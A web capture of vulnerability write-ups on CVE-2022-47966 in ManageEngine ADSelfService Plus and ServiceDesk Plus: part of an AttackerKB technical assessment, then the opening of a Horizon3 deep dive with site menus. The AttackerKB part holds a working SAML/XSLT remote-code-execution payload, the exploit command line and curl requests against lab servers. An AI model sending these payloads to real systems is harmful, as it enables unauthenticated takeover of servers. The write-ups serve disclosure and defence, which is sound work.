      <ds:SignatureValue>RbBWB6AIP8AN1wTZN6YYCKdnClFoh8GqmU2RXoyjmkr6I0AP371IS7jxSMS2zxFCdZ80kInvgVuaEt3yQmcq33/d6yGeOxZU7kF1f1D/da+oKmEoj4s6PQcvaRFNp+RfOxMECBWVTAxzQiH/OUmoL7kyZUhUwP9G8Yk0tksoV9pSEXUozSq+I5KEN4ehXVjqnIj04mF6Zx6cjPm4hciNMw1UAfANhfq7VC5zj6VaQfz7LrY4GlHoALMMqebNYkEkf2N1kDKiAEKVePSo1vHO0AF++alQRJO47c8kgzld1xy5ECvDc7uYwuDJo3KYk5hQ8NSwvana7KdlJeD62GzPlw==</ds:SignatureValue>
      <ds:KeyInfo/>
    </ds:Signature>

```
### Exploiting ADSelfService Plus

Exploiting CVE-2022-47966 against a vulnerable instance of ManageEngine ADSelfService Plus can be achieved with a small modification to the [publicly available PoC](https://github.com/horizon3ai/CVE-2022-47966). This modification includes the addition of a HTTP request parameter `RelayState`. There are two additional requirements an attacker must satisfy before being able to exploit the target:

* The attacker must know in advance a unique GUID value that has been created for the target server’s SAML Service Provider
* The attacker must know in advance a custom `Issuer URL` used by the Identity Provider which has been configured as the SAML authentication provider for the target server

It’s not immediately clear whether an attacker can discover these two values easily; we used the admin interface to obtain them.

The remainder of this walkthrough targets ADSelfService Plus build 6122 running on Windows Server 2022. ADSelfService Plus ships version 1.4.1 of [Apache Santuario]([https://santuario.apache.org/download.html]](https://santuario.apache.org/download.html%5D) in the library file `xmlsec-1.4.1.jar`, which, as discussed above, is vulnerable to a remote code execution issue from 2008.

#### Is the target vulnerable?

We can query a target’s version number through an unauthenticated REST API via the command:

```
curl -i -v -k https://172.30.132.194:9251/servlet/GetProductVersion -X POST

```

The response will be a JSON object that provides the target’s product name and build number, as shown below:

```
{"DB_TYPE":"postgres","BUILD_NUMBER":"6122","BUILD_ARCHITECTURE":"64","RUNNING_AS_SERVICE":false,"HA_SUPPORTED":"true","PRODUCT_SEQ_NO":"ADSSP-4-4A5RH563-1223578957895","PRODUCT_NAME":"ManageEngine ADSelfService Plus","IS_BUNDLED_DB":"true","INSTALLED_AS_SERVICE":false,"PRODUCT_VERSION":"6.1","SERVICE_ACCOUNT_PRIVILEGED":true}

```

As per the [ManageEngine advisory](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html), any version prior to 6210 is vulnerable.

#### Running the exploit

We can run the exploit against a target in our lab as follows:

```
python CVE-2022-47966.py --command calc.exe --url https://172.30.132.194:9251/samlLogin/3899e6a9ab0f2b437448258c4c14eafdd8760add --issuer https://ad.test-domain/saml/3899e6a9ab0f2b437448258c4c14eafdd8760add --relaystate https://172.30.132.194:9251/samlLogin/LoginAuth

```

As shown above the attacker must supply the unique GUID as part of the requested URL to the `/samlLogin` endpoint, as well as supplying a custom `Issuer URL`.

#### Stepping through the code

If we attach a debugger to the ADSelfService Plus service, we can step through exploitation to better understand what happens.

The HTTP POST request to the `/samlLogin/` endpoint will call `doPost` in the `SAMLIDPAuthServlet` class:

```
// ManageEngineADSFramework.jar!\com\manageengine\ads\fw\iamapps\handler\sso\idpauth\SAMLIDPAuthServlet.class
	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String authFlow = null;
        String urlConfigId = null;
        String relayState = null;
        String uri = null;
        String contextPath = null;
        String reqMethod = null;
        String samlResponse = null;
        String errorPageUrl = null;
        String userName = null;
        String samlParamName = null;
        Boolean isValidUrl = false;
        JSONObject samlConfigParams;
        SAMLInterface samlAuthClass;
        try {
            errorPageUrl = SAMLIDPAuthHandler.getAuthParamValue("AUTH_ERROR_URL");
            uri = request.getRequestURI();
            contextPath = request.getContextPath().toString();
            samlParamName = uri.contains(SAMLIDPAuthHandler.getAuthParamValue("AUTH_LOGIN_URL")) ? "AUTH_LOGIN_URL" : "AUTH_LOGOUT_URL";
            urlConfigId = uri.replaceAll(contextPath + SAMLIDPAuthHandler.getAuthParamValue(samlParamName) + "/", "");
            request.setAttribute("URL_CONFIG_ID", urlConfigId);
            if (!SAMLIDPAuthHandler.isValidUrlConfigId(urlConfigId)) {
                this.context.getRequestDispatcher(errorPageUrl).forward(request, response);
            } else {
                relayState = request.getParameter("RelayState") != null ? request.getParameter("RelayState") : "";
                if (!"".equals(relayState)) {
                    relayState = SSOSAMLHandler.decode(relayState);
                }
                String authRuleName;
                if (uri.contains("samlLogin")) {
                    authFlow = SAMLIDPAuthHandler.getAuthFlow(request, urlConfigId); // <----- [1]
                    reqMethod = request.getMethod();
                    samlResponse = request.getParameter("SAMLResponse");
                    logger.log(Level.INFO, "uri :: " + uri + "\tMethod :: " + reqMethod + "\t Authentication Flow :: " + authFlow + "\t URL ID :: " + urlConfigId);
                    if ("POST".equalsIgnoreCase(reqMethod) && samlResponse != null && !"".equals(samlResponse) && authFlow != null && !"".equals(authFlow) && urlConfigId != null && !"".equals(urlConfigId)) { // <----- [2]
                        request.setAttribute("AUTH_FLOW", authFlow);
                        request.getSession().setAttribute("SAML_RELAY_STATE", relayState);
                        JSONObject userDetails = SAMLIDPAuthHandler.validateSAMLResponse(request); // <----- [3]

```

We can see from [1] above that the `authFlow` value is retrieved based on the request. This value is checked to be non-null in [2] before we can continue. The `authFlow` is determined by the provided `RelayState` parameter from the HTTP request and is configured to be mandatory (ie, the request must supply this parameter in order to continue). We then continue on to perform `validateSAMLResponse` [3].

```
// ManageEngineADSFramework.jar!\com\manageengine\ads\fw\iamapps\handler\sso\idpauth\SAMLIDPAuthHandler.class
    public static JSONObject validateSAMLResponse(HttpServletRequest request) throws Exception {
        Response samlResponse = null;
        Assertion assertion = null;
        Subject samlSubject = null;
        Status status = null;
        StatusCode statusCode = null;
        JSONObject userDetails = null;
        String samlNameID = null;
        String samlNameIDFormat = null;
        try {
            DefaultBootstrap.bootstrap();
            samlResponse = (Response)getXMLObject(request.getParameter("SAMLResponse")); // <----- [1]
            String issuerUrl;
            try {
                (new ResponseSchemaValidator()).validate(samlResponse);
                status = samlResponse.getStatus();
                (new StatusSchemaValidator()).validate(status);
                statusCode = status.getStatusCode();
                issuerUrl = statusCode.getValue();
                if (!"urn:oasis:names:tc:SAML:2.0:status:Success".equals(issuerUrl)) {
                    throw new Exception("ads.login.common.error.saml_response_status_not_success");
                }
                if (samlResponse.getAssertions().size() > 0) {
                    assertion = (Assertion)samlResponse.getAssertions().get(0); // <----- [2]
                }
                (new AssertionSchemaValidator()).validate(assertion);
            } catch (ValidationException var46) {
                LOGGER.log(Level.INFO, "EXCEPTION :: " + var46.getMessage());
                throw new Exception("ads.login.common.error.invalid_saml_response_or_assertion");
            }
            issuerUrl = assertion.getIssuer().getValue(); // <----- [3]
            String var10000 = (String)request.getSession().getAttribute(issuerUrl);
            String inResponseTo = samlResponse.getInResponseTo();
            String urlConfigId = (String)request.getAttribute("URL_CONFIG_ID");
            String authFlow = (String)request.getAttribute("AUTH_FLOW");
            String relayState = request.getParameter("RelayState") != null ? request.getParameter("RelayState") : "";
            if (!"".equals(relayState)) {
                relayState = SSOSAMLHandler.decode(relayState);
            }
            if (!isValidIssuerUrl(issuerUrl, urlConfigId)) { // <----- [4]
                throw new Exception("ads.login.common.error.invalid_issuer_url_found");
            }
            if (authFlow.equals("FACTOR_AUTHENTICATION")) {
                if (inResponseTo == null) {
                    throw new Exception("ads.login.common.error.idp_initiated_saml");
                }
                if (!isInResponseToValid(inResponseTo)) {
                    throw new Exception("ads.login.common.error.invalid_saml_invalid_inresponseto");
                }
            }

            String samlFlow = "IDP_INITIATED_SAML_SSO";
            if (authFlow.equals("SAML_LOGIN") && inResponseTo != null) {
                samlFlow = "SP_INITIATED_SAML_SSO";
            }
            request.getSession().setAttribute("SAML_FLOW", samlFlow);
            request.setAttribute("REQUEST_ID", inResponseTo);
            JSONObject samlConfigDetails = getSAMLConfigDetails(urlConfigId);
            String authMode = "SAML_LOGIN".equals(authFlow) ? "LOGIN_AUTH" : relayState.substring(relayState.lastIndexOf("/") + 1, relayState.length());
            long reqAuthBit = getAuthModeBitVsName(authMode);
            long assignedAuthBit = samlConfigDetails.getLong("AUTH_MODE_BIT");
            boolean isSAMLResponseSigned = false;
            boolean isSAMLAssertionSigned = false;
            if ((reqAuthBit & assignedAuthBit) != reqAuthBit) {
                throw new Exception("ads.login.common.error.invalid_saml_config_id_found");
            }

            if (samlConfigDetails.length() > 0) {
                try {
                    if (samlResponse.isSigned()) {
                        validateSignature(samlResponse, samlConfigDetails);
                        isSAMLResponseSigned = true;
                    }
                    if (assertion.isSigned()) {
                        validateSignature(assertion, samlConfigDetails); // <------ [5]
                        isSAMLAssertionSigned = true;
                    }

```

We can see above [1] that the base64-encoded `SAMLResponse` parameter is retrieved from the HTTP request and the `Assertions` element from the `SAMLResponse` is retrieved [2]. The `Issuer UR`L value is retrieved from the Assertion element [3] before being verified as the expected Issuer for the SAML response [4], as identified by the unique GUID supplied to the `/samlLogin/` endpoint. **If the Issuer is not the expected value, an exception will be raised and the request will not be processed further.** The signed Assertion element from the request can now be validated [5].

```
// ManageEngineADSFramework.jar!\com\manageengine\ads\fw\iamapps\handler\sso\idpauth\SAMLIDPAuthHandler.class
    public static void validateSignature(SignableXMLObject samlObject, JSONObject samlConfigDetails) throws SecurityException {
        KeySpec publicKeySpec = null;
        BasicX509Credential credential = new BasicX509Credential();
        try {
            String pubKey = samlConfigDetails.optString("PUBLIC_KEY", (String)null);
            if (!pubKey.contains("-----BEGIN CERTIFICATE-----")) {
                pubKey = "-----BEGIN CERTIFICATE-----\n" + pubKey + "-----END CERTIFICATE-----";
            } else {
                pubKey = pubKey.replaceAll("-----BEGIN CERTIFICATE-----", "-----BEGIN CERTIFICATE-----\n");
            }
            byte[] certByte = pubKey.getBytes();
            CertificateFactory certificateFactory = CertificateFactory.getInstance("X.509");
            InputStream certInputStream = new ByteArrayInputStream(certByte);
            Certificate certificate = certificateFactory.generateCertificate(certInputStream);
            publicKeySpec = new X509EncodedKeySpec(certificate.getPublicKey().getEncoded());
            KeyFactory keyFactory = KeyFactory.getInstance("RSA");
            PublicKey publicKey = keyFactory.generatePublic(publicKeySpec);
            credential.setPublicKey(publicKey);
            SignatureValidator signatureValidator = new SignatureValidator(credential);
            signatureValidator.validate(samlObject.getSignature());	// <------ [1]

			// ...snip...

// xmltooling-1.3.1.jar!\org\opensaml\xml\signature\SignatureValidator.class
    public void validate(Signature signature) throws ValidationException {
        this.log.debug("Attempting to validate signature using key from supplied credential");
        XMLSignature xmlSig = this.buildSignature(signature);
        Key validationKey = SecurityHelper.extractVerificationKey(this.validationCredential);
        if (validationKey == null) {
            this.log.debug("Supplied credential contained no key suitable for signature validation");
            throw new ValidationException("No key available to validate signature");
        } else {
            this.log.debug("Validating signature with signature algorithm URI: {}", signature.getSignatureAlgorithm());
            this.log.debug("Validation credential key algorithm '{}', key instance class '{}'", validationKey.getAlgorithm(), validationKey.getClass().getName());
            try {
                if (xmlSig.checkSignatureValue(validationKey)) { // <----- [2]

```

Validation of the `Signature` element (from the HTTP requests `SAMLResponse` parameter) occurs in the OpenSAML SignatureValidator class [1] which will proceed to call `checkSignatureValue` from the vulnerable `xmlsec-1.4.1.jar` library [2]. This signature check will ultimately fail; however, arbitrary code execution will have been achieved when the signature is processed by the vulnerable xmlsec library.

### Exploiting ServiceDesk Plus

Unlike ADSelfService Plus, **ServiceDesk Plus is exploitable using the public proof of concept with no special steps**, provided SAML authentication is (or has ever been) enabled. (To enable SAML, the setting is under Admin / Users & Permissions / SAML Single Sign On; we recommend using [Mock SAML](https://mocksaml.com/) as a back end).

To demonstrate the exploit, we stripped down the XML payload to the minimum that executes a process (we moved the important XSLT to the left margin to stand out better):

```
<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response ID="_eddc1e5f-8c87-4e55-8309-c6d69d6c2adf" InResponseTo="_4b05e414c4f37e41789b6ef1bdaaa9ff" IssueInstant="2023-01-16T13:56:46.514Z" Version="2.0" xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
  <Assertion ID="_b5a2e9aa-8955-4ac6-94f5-334047882600" IssueInstant="2023-01-16T13:56:46.498Z" Version="2.0" xmlns="urn:oasis:names:tc:SAML:2.0:assertion">
    <Issuer>{issuer}</Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo>
        <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
        <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
        <ds:Reference URI="#_b5a2e9aa-8955-4ac6-94f5-334047882600">
          <ds:Transforms>
            <ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
  <xsl:template match="/">
      <xsl:variable name="rtobject" select="rt:getRuntime()"/>
      <xsl:variable name="process" select="rt:exec($rtobject,'notepad.exe')"/>
      <xsl:variable name="processString" select="ob:toString($process)"/>
      <xsl:value-of select="$processString"/>
  </xsl:template>
</xsl:stylesheet>
          </ds:Transform>
          </ds:Transforms>
          <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
          <ds:DigestValue></ds:DigestValue>
        </ds:Reference>
      </ds:SignedInfo>
      <ds:KeyInfo/>
    </ds:Signature>
  </Assertion>
</samlp:Response>

```

We can send this using `curl`:

```
[ron@fedora ~]$ curl -i 'http://10.0.0.216:8080/SamlResponseServlet' --data-urlencode "SAMLResponse="$(base64 -w0 < ~/shared/tmp/demo.xml)
[...]
HTTP/1.1 500
Location: /
vary: accept-encoding
Content-Type: text/html;charset=UTF-8
Transfer-Encoding: chunked
Date: Fri, 20 Jan 2023 22:07:48 GMT
Connection: close
Server: -
[...]

```

Then we can verify that notepad.exe is indeed running on the target (as the privileged `System` user, to boot)!

## Guidance

The vulnerability should be remediated immediately, without waiting for a typical patch cycle. Any organization with a vulnerable ManageEngine service exposed to the public internet should examine their systems for signs of compromise in addition to remediating the vulnerability.

## References

* [Vendor advisory](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html)
* [Discovery’s disclosure blog](https://blog.viettelcybersecurity.com/saml-show-stopper/)
* [Rapid7 blog](https://www.rapid7.com/blog/post/2023/01/19/etr-cve-2022-47966-rapid7-observed-exploitation-of-critical-manageengine-vulnerability/)
* [Horizon3’s writeup / PoC](https://www.horizon3.ai/manageengine-cve-2022-47966-technical-deep-dive/)
* [Horizon3’s IoCs](https://www.horizon3.ai/manageengine-cve-2022-47966-iocs/)
* [Previous research](https://blog.tint0.com/2021/09/pinging-xmlsec.html)
* [Xalan prevalence](https://mvnrepository.com/artifact/xalan/xalan)

# Report as Emergent Threat Response

Please provide the link to the ETR blog if available.

Add a reference URL (optional):

Report as ETR
Update Report

# Report as Exploited in the Wild

AttackerKB users want to know this is information they can trust.

Help the community by indicating the source(s) of your knowledge:

* Vendor Advisory

  Add a reference URL
  (required):

  Please provide a link to the Vendor Advisory.
* Government or Industry Alert

  Add a reference URL
  (required):

  Please provide a link to the Government or Industry Alert.
* Threat Feed

  Add a reference URL
  (required):

  Please provide a link to the Threat Feed.
* News Article or Blog

  Add a reference URL
  (required):

  Please provide a link to the News Reference.
* Exploitation personally observed in an environment (client, customer, employer, or personal environment)

  Add a reference URL
  (required):

  Please provide a link or [create an assessment](/topics/gvs0Gv8BID/cve-2022-47966/assess) as evidence to support your personal observation claim.
* Other:

  Please explain the source of your report.

  Add a reference URL
  (required):

  Please provide a link or [create an assessment](/topics/gvs0Gv8BID/cve-2022-47966/assess) as evidence of the source of your report.

Report and add more details
Report as Exploited
Update Report

## CVE ID

AttackerKB requires a CVE ID in order to pull vulnerability data and references from the [CVE list](https://cve.mitre.org)
and the [National Vulnerability Database](https://nvd.nist.gov). If available, please supply below:

CVE ID:

## Add References:

Cancel
Submit

![](/static/public/img/close-white.svg)
## Quick Cookie Notification

This site uses cookies for anonymized analytics to improve the site.

Rapid7 will never sell the data collected on this site.

I AGREE, LET’S GO!

---

View our [Cookie Policy](https://www.rapid7.com/privacy-policy/tracking-technologies/) for full details

This site uses cookies for anonymized analytics. For more information or to change your cookie settings, view our [Cookie Policy](https://www.rapid7.com/privacy-policy/tracking-technologies/).

![](/static/public/img/close-white.svg)

[Terms of Use](/terms)
[Code of Conduct](/codeofconduct)
[FAQ](/faq)
[Changelog](/changelog)
[Privacy Policy](https://rapid7.com/privacy-policy)
Contact
[API](https://api.attackerkb.com/v1/api-docs/docs)
[A Rapid7 Project](https://www.rapid7.com)

[![](/static/public/img/logo-condensed-dark.png)](/)



=== Content from www.horizon3.ai_fe8c3d31_20250111_143250.html ===


[Skip to main content](#brx-content)
[Skip to footer](#brx-footer)
[![Renmoe Library](https://www.horizon3.ai/wp-content/uploads/2024/11/Horizon3ai_Logo_Tagline_Horizontal_RGB-WhiteTxt_NoTag.png)](https://www.horizon3.ai)

* Solutions
  + Security Strategies
  + [→ Effective Security](/effectivesecurity)
  + [→ Splunk Logging](https://www.horizon3.ai/for-splunk/)
  + [→ Purple Team Culture](https://www.horizon3.ai/purple-team-culture/)
  + [→ Vulnerable ≠ Exploitable](https://www.horizon3.ai/vulnerable-not-exploitable/)
  + [NodeZero for Compliance](https://www.horizon3.ai/compliance/)
  + [→ PCI Complinace](https://www.horizon3.ai/compliance/pci-pentesting/)
  + [→ NIS 2 Compliance](https://www.horizon3.ai/compliance/nis-2-compliance/)
  + [The NodeZero™ Platform](https://www.horizon3.ai/nodezero/)
  + [→ Internal Pentesting](https://www.horizon3.ai/nodezero/continuous-internal-pentesting/)
  + [→ External Pentesting](https://www.horizon3.ai/nodezero/external-pentesting/)
  + [→ Kubernetes Pentesting](https://www.horizon3.ai/nodezero/kubernetes-pentesting/)
  + [→ Cloud Pentesting](https://www.horizon3.ai/nodezero/cloud-pentesting/)
  + [→ Rapid Response](https://www.horizon3.ai/nodezero/rapid-response/)
  + [→ NodeZero Insights](https://www.horizon3.ai/nodezero/insights/)
  + [→ AD Password Audit](https://www.horizon3.ai/nodezero/nodezero-ad-password-audit/)
  + [→ Phishing Impact Testing](https://www.horizon3.ai/nodezero/phishing-impact-testing/)
  + [→ NodeZero Tripwires](https://www.horizon3.ai/nodezero/nodezero-tripwires/)
  + [Documentation](https://docs.horizon3.ai/getting_started/)
  + Use Cases
  + [→ Public Sector](https://www.horizon3.ai/use-case/nodezero-in-the-public-sector/)
  + [→ Education](https://www.horizon3.ai/use-case/nodezero-in-education/)
  + [→ Healthcare](https://www.horizon3.ai/use-case/for-healthcare/)
  + [→ Manufacturing](https://www.horizon3.ai/use-case/nodezero-in-manufacturing/)
  + [→ Supply Chain](https://www.horizon3.ai/use-case/nodezero-for-supply-chain/)
  + [→ Large Organizations](/who-uses-nodezero#large-org)
  + [→ MSSP and MSP](https://www.horizon3.ai/partners/mssp-msp/)
  + [Who Uses NodeZero?](https://www.horizon3.ai/who-uses-nodezero/)
  + [→ ITOps and SecOps](/who-uses-nodezero#itops)
  + [→ Security Teams](/who-uses-nodezero#security-teams)
  + [→ Pentesters](/who-uses-nodezero#pentesters)
* Partners
  + [MSSPs and MSPs](https://www.horizon3.ai/partners/mssp-msp/)
  + [Partners](https://www.horizon3.ai/partners/)
  + [Become A Partner](https://www.horizon3.ai/partners#become-a-partner-form)
  + [Partner Portal](https://partners.horizon3.ai/)
* Resources
  + [Resource Center](https://www.horizon3.ai/resource-center/)
  + [Attack Research](https://www.horizon3.ai/category/attack-research/)
  + [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Customer Stories](https://www.horizon3.ai/category/customer-story/)
  + [Webinar Replays](https://www.horizon3.ai/category/intelligence/webinars/)
  + [Credential Attacks](https://www.horizon3.ai/credentialattacks/)
  + [Log4Shell](https://www.horizon3.ai/log4shell/)
  + [Ransomware Impact](https://www.horizon3.ai/ransomware/)
  + [Glossary](https://www.horizon3.ai/resource-center/glossary/)
  + [Simplify Compliance with NodeZero: CMMC, DFARS, and NIST 800-171](https://www.horizon3.ai/intelligence/blogs/simplify-compliance-with-nodezero-cmmc-dfars-and-nist-800-171/)

    January 6, 2025  |  [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Securing Financial Services: 5 Critical Cybersecurity Advantages of NodeZero](https://www.horizon3.ai/intelligence/infographics/securing-financial-services-5-critical-cybersecurity-advantages-of-nodezero/)

    January 3, 2025  |  [Infographics](https://www.horizon3.ai/category/intelligence/infographics/)
  + [NodeZero Insights™: Proof Over Promises in Cybersecurity](https://www.horizon3.ai/intelligence/blogs/nodezero-insights-proof-over-promises-in-cybersecurity/)

    December 17, 2024  |  [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Uncover Kubernetes Security Weaknesses with NodeZero™](https://www.horizon3.ai/intelligence/webinars/uncover-kubernetes-security-weaknesses-with-nodezero/)

    December 13, 2024  |  [Webinar Replays](https://www.horizon3.ai/category/intelligence/webinars/)
* Company
  + [Our Vision](https://www.horizon3.ai/horizon3-security-vision/)
  + [Meet The Team](https://www.horizon3.ai/about-us/)
  + [Join The Team](https://www.horizon3.ai/join-our-team/)
  + [Awards](https://www.horizon3.ai/category/news/awards/)
  + [Press Releases](https://www.horizon3.ai/category/news/press-release/)
  + [Contact Us](https://www.horizon3.ai/contact-us/)
  + [Upcoming Events](https://www.horizon3.ai/events/)
* [Log In](https://portal.horizon3ai.com/)
* Try NodeZero
  + [Get A Demo](https://www.horizon3.ai/contact-us/schedule-demo/)
  + [Free Trial](https://portal.horizon3ai.com/)

* Solutions
  + Security Strategies
  + [→ Effective Security](/effectivesecurity)
  + [→ Splunk Logging](https://www.horizon3.ai/for-splunk/)
  + [→ Purple Team Culture](https://www.horizon3.ai/purple-team-culture/)
  + [→ Vulnerable ≠ Exploitable](https://www.horizon3.ai/vulnerable-not-exploitable/)
  + [NodeZero for Compliance](https://www.horizon3.ai/compliance/)
  + [→ PCI Complinace](https://www.horizon3.ai/compliance/pci-pentesting/)
  + [→ NIS 2 Compliance](https://www.horizon3.ai/compliance/nis-2-compliance/)
  + [The NodeZero™ Platform](https://www.horizon3.ai/nodezero/)
  + [→ Internal Pentesting](https://www.horizon3.ai/nodezero/continuous-internal-pentesting/)
  + [→ External Pentesting](https://www.horizon3.ai/nodezero/external-pentesting/)
  + [→ Kubernetes Pentesting](https://www.horizon3.ai/nodezero/kubernetes-pentesting/)
  + [→ Cloud Pentesting](https://www.horizon3.ai/nodezero/cloud-pentesting/)
  + [→ Rapid Response](https://www.horizon3.ai/nodezero/rapid-response/)
  + [→ NodeZero Insights](https://www.horizon3.ai/nodezero/insights/)
  + [→ AD Password Audit](https://www.horizon3.ai/nodezero/nodezero-ad-password-audit/)
  + [→ Phishing Impact Testing](https://www.horizon3.ai/nodezero/phishing-impact-testing/)
  + [→ NodeZero Tripwires](https://www.horizon3.ai/nodezero/nodezero-tripwires/)
  + [Documentation](https://docs.horizon3.ai/getting_started/)
  + Use Cases
  + [→ Public Sector](https://www.horizon3.ai/use-case/nodezero-in-the-public-sector/)
  + [→ Education](https://www.horizon3.ai/use-case/nodezero-in-education/)
  + [→ Healthcare](https://www.horizon3.ai/use-case/for-healthcare/)
  + [→ Manufacturing](https://www.horizon3.ai/use-case/nodezero-in-manufacturing/)
  + [→ Supply Chain](https://www.horizon3.ai/use-case/nodezero-for-supply-chain/)
  + [→ Large Organizations](/who-uses-nodezero#large-org)
  + [→ MSSP and MSP](https://www.horizon3.ai/partners/mssp-msp/)
  + [Who Uses NodeZero?](https://www.horizon3.ai/who-uses-nodezero/)
  + [→ ITOps and SecOps](/who-uses-nodezero#itops)
  + [→ Security Teams](/who-uses-nodezero#security-teams)
  + [→ Pentesters](/who-uses-nodezero#pentesters)
* Partners
  + [MSSPs and MSPs](https://www.horizon3.ai/partners/mssp-msp/)
  + [Partners](https://www.horizon3.ai/partners/)
  + [Become A Partner](https://www.horizon3.ai/partners#become-a-partner-form)
  + [Partner Portal](https://partners.horizon3.ai/)
* Resources
  + [Resource Center](https://www.horizon3.ai/resource-center/)
  + [Attack Research](https://www.horizon3.ai/category/attack-research/)
  + [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Customer Stories](https://www.horizon3.ai/category/customer-story/)
  + [Webinar Replays](https://www.horizon3.ai/category/intelligence/webinars/)
  + [Credential Attacks](https://www.horizon3.ai/credentialattacks/)
  + [Log4Shell](https://www.horizon3.ai/log4shell/)
  + [Ransomware Impact](https://www.horizon3.ai/ransomware/)
  + [Glossary](https://www.horizon3.ai/resource-center/glossary/)
  + [Simplify Compliance with NodeZero: CMMC, DFARS, and NIST 800-171](https://www.horizon3.ai/intelligence/blogs/simplify-compliance-with-nodezero-cmmc-dfars-and-nist-800-171/)

    January 6, 2025  |  [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Securing Financial Services: 5 Critical Cybersecurity Advantages of NodeZero](https://www.horizon3.ai/intelligence/infographics/securing-financial-services-5-critical-cybersecurity-advantages-of-nodezero/)

    January 3, 2025  |  [Infographics](https://www.horizon3.ai/category/intelligence/infographics/)
  + [NodeZero Insights™: Proof Over Promises in Cybersecurity](https://www.horizon3.ai/intelligence/blogs/nodezero-insights-proof-over-promises-in-cybersecurity/)

    December 17, 2024  |  [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Uncover Kubernetes Security Weaknesses with NodeZero™](https://www.horizon3.ai/intelligence/webinars/uncover-kubernetes-security-weaknesses-with-nodezero/)

    December 13, 2024  |  [Webinar Replays](https://www.horizon3.ai/category/intelligence/webinars/)
* Company
  + [Our Vision](https://www.horizon3.ai/horizon3-security-vision/)
  + [Meet The Team](https://www.horizon3.ai/about-us/)
  + [Join The Team](https://www.horizon3.ai/join-our-team/)
  + [Awards](https://www.horizon3.ai/category/news/awards/)
  + [Press Releases](https://www.horizon3.ai/category/news/press-release/)
  + [Contact Us](https://www.horizon3.ai/contact-us/)
  + [Upcoming Events](https://www.horizon3.ai/events/)
* [Log In](https://portal.horizon3ai.com/)
* Try NodeZero
  + [Get A Demo](https://www.horizon3.ai/contact-us/schedule-demo/)
  + [Free Trial](https://portal.horizon3ai.com/)

![](https://www.horizon3.ai/wp-content/uploads/2023/01/1200x627-Red-Team-ManageEngine-Technical-768x401.jpg)

# ManageEngine CVE-2022-47966 Technical Deep Dive

James Horseman  |  January 19, 2023  |  [Attack Blogs](https://www.horizon3.ai/category/attack-research/attack-blogs/)
# Introduction

On January 10, 2023, ManageEngine released a security advisory for [CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) (discovered by [Khoadha of Viettel Cyber Security](https://twitter.com/_l0gg)) affecting a wide range of products. The vulnerability allows an attacker to gain remote code execution by issuing a HTTP POST request containing a malicious SAML response. This vulnerability is a result of  using an outdated version of [Apache Santuario](https://santuario.apache.org/) for XML signature validation.

# Patch Analysis

We started our initial research by examining the differences between ServiceDesk Plus version 14003 and version 14004. By default, Service Desk is installed into `C:\Program Files\ManageEngine\ServiceDesk`. We installed both versions and extracted the jar files for comparison.

While there are many jar files that have been updated, we notice that there was a single jar file that has been completely changed. `libxmlsec` from Apache Santuario was updated from 1.4.1 to 2.2.3. Version 1.4.1 is over a decade old.

[![Jar differences](https://www.horizon3.ai/wp-content/uploads/2023/01/Screenshot-2023-01-17-at-12.44.58-PM.png)](https://www.horizon3.ai/wp-content/uploads/2023/01/Screenshot-2023-01-17-at-12.44.58-PM.png)

Jar differences

That is a large version jump, but if we start with the [1.4.2 release notes](https://santuario.apache.org/java142releasenotes.html) we find an interesting change:

* Switch order of XML Signature validation steps. See Issue 44629.

Issue 44629 can be found [here.](https://bz.apache.org/bugzilla/show_bug.cgi?id=44629) It describes switching the order of XML signature validation steps and the security implications.

# XML Signature Validation

[XML signature validation](https://www.w3.org/TR/xmldsig-core1/#sec-Introduction) is a complex beast, but it can be simplified down to the the following two steps:

* Reference Validation – validate that each `<Reference>` element within the `<SignedInfo>` element has a valid digest value.
* Signature Validation – cryptographically validate the `<SignedInfo>` element. This assures that the `<SignedInfo>`element has not been tampered with.

While the official XML signature validation spec lists reference validation followed by signature validation, these two steps can be performed in any order. Since the reference validation step can involve processing attacker controlled XML `Transforms`, one should always perform the signature validation step first to ensure that the transforms came from a trusted source.

# SAML Information Flow Refresher

Applications that support single sign-on typically use an authorization solution like SAML. When a user logs into a remote service, that service forwards the authentication request to the SAML Identity Provider. The SAML Identity Provider will then validate that the user credentials are correct and that they are authorized to access the specified service. The Identity Provider then returns a response to the client which is forwarded to the Service Provider.

The information flow of a login request via SAML can been seen below. One of the critical pieces is understanding that the information flow uses the client’s browser to relay all information between the Service Provider (SP) and the Identity Provider (IDP). In this attack, we send a request containing malicious SAML XML directly to the service provider’s Assertion Consumer (ACS) URL.

![SAML Information Flow](https://www.horizon3.ai/wp-content/uploads/2023/01/saml-2.png)

Information flow via https://cloudsundial.com/

# The Vulnerability

### Vulnerability Ingredient 1: SAML Validation Order

Understanding that SAML information flow allows an attacker to introduce or modify the SAML data in transit, it should now be clear why the Apache Santuario update to now perform signature validation to occur before reference validation was so important. This vulnerability will abuse the verification order as the first step in exploitation. See below for the diff between v1.4.1 and v.1.4.2.

[![1.4.1 vs 1.4.2](https://www.horizon3.ai/wp-content/uploads/2023/01/Screenshot-2023-01-17-at-2.43.36-PM.png)](https://www.horizon3.ai/wp-content/uploads/2023/01/Screenshot-2023-01-17-at-2.43.36-PM.png)

1.4.1 vs 1.4.2

